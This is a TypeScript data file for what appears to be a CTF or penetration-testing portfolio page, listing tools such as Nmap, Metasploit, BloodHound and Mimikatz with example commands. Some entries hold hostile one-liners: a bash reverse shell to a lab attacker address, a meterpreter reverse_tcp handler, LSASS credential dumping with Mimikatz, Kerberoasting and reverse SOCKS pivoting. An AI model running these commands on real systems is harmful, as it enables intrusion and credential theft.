import { Tool } from "@/types/tool";

export const toolsData: Tool[] = [
  {
    id: "nmap",
    name: "Nmap",
    category: "Network Recon",
    description: "Host discovery, port scanning, OS detection, and custom vulnerability scripting (NSE).",
    blurb: "Used as the initial entry point on every machine box for full port discovery, service enumeration, and script scanning.",
    commands: [
      "nmap -sC -sV -oA nmap/initial <target_ip>",
      "nmap -p- --min-rate 10000 <target_ip>",
      "nmap --script vuln -p 80,443 <target_ip>"
    ],
    writeups: [],
    iconName: "nmap",
    accentColor: "#60a5fa",
    colorClass: "text-blue-400 group-hover:text-blue-500",
    hoverBorder: "hover:border-blue-500/40"
  },
  {
    id: "burp-suite",
    name: "Burp Suite",
    category: "Web App Proxy",
    description: "Proxy intercept, web request tampering, repeater, intruder, and automated scanner tests.",
    blurb: "Essential tool for analyzing web applications, capturing requests, tampering with parameters, and fuzzing hidden endpoints.",
    commands: [
      "Proxy: 127.0.0.1:8080 (Intercept ON/OFF)",
      "Repeater: Ctrl+R / Cmd+R (Modify & Replay)",
      "Intruder: Sniper / Pitchfork (Fuzzing)"
    ],
    writeups: [],
    iconName: "burp-suite",
    accentColor: "#fb923c",
    colorClass: "text-orange-400 group-hover:text-orange-500",
    hoverBorder: "hover:border-orange-500/40"
  },
  {
    id: "metasploit",
    name: "Metasploit",
    category: "Exploitation",
    description: "Modular framework for writing, testing, and executing exploit payloads against targets.",
    blurb: "Leveraged for rapid proof-of-concept exploits, handler listeners, and post-exploitation module execution.",
    commands: [
      "msfconsole -q",
      "use exploit/multi/handler",
      "set PAYLOAD linux/x64/meterpreter/reverse_tcp"
    ],
    writeups: [],
    iconName: "metasploit",
    accentColor: "#f87171",
    colorClass: "text-red-400 group-hover:text-red-500",
    hoverBorder: "hover:border-red-500/40"
  },
  {
    id: "python-bash",
    name: "Python & Bash",
    category: "Exploit Dev",
    description: "Writing custom scripts, automating payload delivery, and modifying proof-of-concepts.",
    blurb: "Primary scripting environment for building custom exploits, stringing API chains, and automating repetitive tasks.",
    commands: [
      "python3 exploit.py --url http://target/ --lhost 10.10.14.x",
      "python3 -m http.server 8000",
      "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"
    ],
    writeups: [],
    iconName: "python-bash",
    accentColor: "#facc15",
    colorClass: "text-yellow-400 group-hover:text-yellow-500",
    hoverBorder: "hover:border-yellow-500/40"
  },
  {
    id: "bloodhound",
    name: "BloodHound",
    category: "Active Directory",
    description: "Mapping complex trust relationships, domain paths, and privilege escalation routes.",
    blurb: "Key tool for Active Directory pathfinding, identifying misconfigured permissions, Kerberoastable accounts, and Domain Admin routes.",
    commands: [
      "python3 bloodhound.py -u user -p pass -d domain.local -ns <dc_ip> -c All",
      "bloodhound-python -u 'user' -p 'pass' -d 'domain.local' -dc 'dc.domain.local' -c All",
      "neo4j console"
    ],
    writeups: [],
    iconName: "bloodhound",
    accentColor: "#c084fc",
    colorClass: "text-purple-400 group-hover:text-purple-500",
    hoverBorder: "hover:border-purple-500/40"
  },
  {
    id: "wireshark",
    name: "Wireshark",
    category: "Packet Analysis",
    description: "Deep inspection of network protocols, packet capturing, analysis, and forensics.",
    blurb: "Used for analyzing raw pcap files, dissecting network communications, and extracting cleartext credentials.",
    commands: [
      "tshark -r capture.pcap -Y 'http.request.method == POST'",
      "wireshark capture.pcapng",
      "tcpdump -i tun0 -w capture.pcap"
    ],
    writeups: [],
    iconName: "wireshark",
    accentColor: "#22d3ee",
    colorClass: "text-cyan-400 group-hover:text-cyan-500",
    hoverBorder: "hover:border-cyan-500/40"
  },
  {
    id: "mimikatz-rubeus",
    name: "Mimikatz & Rubeus",
    category: "AD Exploitation",
    description: "LSASS dumping, ticket extraction, Pass-the-Hash (PtH), and Kerberos ticket attacks.",
    blurb: "Used on Windows target machines for credential extraction from memory and interacting with Kerberos tickets (Kerberoasting, AS-REP Roasting, Pass-the-Ticket).",
    commands: [
      "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
      "Rubeus.exe kerberoast /outfile:hashes.txt",
      "Rubeus.exe asreproast /format:hashcat"
    ],
    writeups: [],
    iconName: "mimikatz-rubeus",
    accentColor: "#34d399",
    colorClass: "text-emerald-400 group-hover:text-emerald-500",
    hoverBorder: "hover:border-emerald-500/40"
  },
  {
    id: "chisel-proxychains",
    name: "Chisel & Proxychains",
    category: "Pivoting & Tunneling",
    description: "Local/remote port forwarding, SOCKS proxy tunneling, and traversing firewall barriers.",
    blurb: "Essential utilities for pivoting into internal target subnets and routing custom exploit traffic through encrypted SOCKS proxies.",
    commands: [
      "chisel server -p 8000 --reverse (Attacker)",
      "chisel client 10.10.14.x:8000 R:socks (Target)",
      "proxychains4 nmap -sT -pn 172.16.1.0/24"
    ],
    writeups: [],
    iconName: "chisel-proxychains",
    accentColor: "#f472b6",
    colorClass: "text-pink-400 group-hover:text-pink-500",
    hoverBorder: "hover:border-pink-500/40"
  },
  {
    id: "hashcat-john",
    name: "Hashcat & John",
    category: "Password Cracking",
    description: "GPU-accelerated hash cracking, custom rule file creation, and credential recovery.",
    blurb: "Used for offline password cracking of NTLM hashes, Kerberos tickets, and encrypted file archives using wordlists and rules.",
    commands: [
      "hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule",
      "john --wordlist=rockyou.txt hashes.txt",
      "hashcat -m 18200 -a 0 krb5tgs.txt rockyou.txt"
    ],
    writeups: [],
    iconName: "hashcat-john",
    accentColor: "#fb7185",
    colorClass: "text-rose-400 group-hover:text-rose-500",
    hoverBorder: "hover:border-rose-500/40"
  }
];
